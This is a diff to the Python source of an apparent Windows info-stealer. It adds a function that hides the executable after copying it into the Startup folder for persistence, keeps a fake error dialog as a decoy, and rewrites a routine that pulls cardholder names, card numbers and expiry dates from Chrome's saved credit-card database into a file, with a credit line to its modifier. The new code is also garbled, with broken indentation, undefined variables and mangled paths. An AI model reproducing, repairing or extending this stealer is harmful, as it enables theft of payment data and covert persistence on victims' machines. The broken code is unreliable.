@@ -82,11 +82,15 @@ def try_extract(func):
 
 def fakeerror():
     messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occured while importing modules.")
+    
+def hide():
+    ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)
 
 def startup():
     startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
     try:
         copy2(argv[0], startup_path)
+        hide()
     except Exception:
         pass
 
@@ -455,21 +459,35 @@ class browsers():
         os.remove("Historyvault.db")
 
     def credit_cards(self, name: str, path: str, profile: str):
-        path += '\\' + profile + '\\Web Data'
+        path += r'\\' + profile + '\\Web Data\\'
         if not os.path.isfile(path):
             return
         copy2(path, "Cardvault.db")
         conn = sqlite3.connect("Cardvault.db")
         cursor = conn.cursor()
-        with open('.\\browser-cc\'s.txt', 'a', encoding="utf-8") as f:
-            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
-                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
-                if name_on_card and card_number_encrypted != "":
-                    f.write(f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.decrypt_password(card_number_encrypted, self.masterkey)}\n")
-        f.close()
-        cursor.close()
-        conn.close()
-        os.remove("Cardvault.db")
+        with open(r'.\\browser-cc.txt\\', 'a', encoding="utf-8") as f:
+            db = ntpath.join(self.chrome_user_data, prof, target)
+
+                        conn = sqlite3.connect(db)
+                        cursor = conn.cursor()
+                        cursor.execute(
+                            "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year, date_modified FROM credit_cards")
+
+                        for r in cursor.fetchall():
+                            NameONCC = r[0]
+                            Card_Num = r[1]
+                            Exp_Mnth = r[2]
+                            Exp_YR = r[3]
+                            Exp = f"{Exp_Mnth}/{Exp_YR}"
+                            LM = r[4]
+                            # Card_Num = self.decrypt_val(Encrypted_Card_Num, self.chrome_key)
+                            f.write(
+                                f"\n=======================\nImproved by: Github.com/LocalSmail\n=======================\nName on CC: {NameONCC} | Card Number: {Card_Num} | Exp: {Exp} | Last Modified: {LM}")
+
+                        cursor.close()
+                        conn.close()
+
+                f.close()
 
 def ss():
     ImageGrab.grab(
